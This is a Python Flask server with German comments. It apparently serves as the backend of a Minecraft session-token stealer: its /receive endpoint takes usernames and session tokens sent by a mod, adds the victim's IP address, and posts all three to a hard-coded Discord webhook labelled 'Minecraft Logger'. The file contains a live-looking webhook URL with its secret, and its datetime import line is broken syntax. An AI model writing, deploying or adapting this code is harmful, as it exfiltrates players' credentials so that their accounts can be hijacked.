from flask import Flask, request, jsonify
import requests
import json
import os
import time
from datetime datetime

app = Flask(__name__)

# Einfache Config - direkt im Code (für Vercel)
CONFIG = {
    "security": {
        "rate_limit_seconds": 600,
        "min_token_length": 0,  # Auf 0 setzen für deine Mod
        "check_duplicate_tokens": False  # Deaktiviert für Vercel
    }
}

# Discord Webhook URL - HIER DEINE URL EINTRAGEN!
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1493597798292127875/vP2BJERnoRPQ4chSvDY0aY_sE1B4ES-tn1SQJdMiwqT0UPxAXvXbYVZqawSqPWX2hY8g"

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers['X-Forwarded-For'].split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers['X-Real-IP']
    return request.remote_addr

def send_to_discord(username, token, ip):
    try:
        embed = {
            "title": "🚨 Neue Minecraft Session",
            "color": 7414964,
            "description": f"**Username:** {username}\n**IP:** {ip}\n**Token:**\n```{token[:200]}```",
            "timestamp": datetime.utcnow().isoformat()
        }
        
        payload = {
            "username": "Minecraft Logger",
            "embeds": [embed]
        }
        
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
        return response.status_code in [200, 204]
    except Exception as e:
        print(f"Discord error: {e}")
        return False

@app.route('/receive', methods=['POST'])
def receive():
    data = request.json
    
    if not data or 'username' not in data or 'token' not in data:
        return jsonify({"status": "error", "message": "Missing username or token"}), 400
    
    username = data['username']
    token = data['token']
    ip = get_client_ip()
    
    print(f"Received - User: {username}, IP: {ip}")
    
    # An Discord senden
    success = send_to_discord(username, token, ip)
    
    if success:
        return jsonify({"status": "success", "message": f"Data for {username} sent to Discord"}), 200
    else:
        return jsonify({"status": "error", "message": "Failed to send to Discord"}), 500

@app.route('/', methods=['GET'])
def health():
    return jsonify({"status": "alive"}), 200

@app.route('/auth', methods=['POST'])
def auth():
    return jsonify({"status": "error", "message": "Use /receive endpoint"}), 404
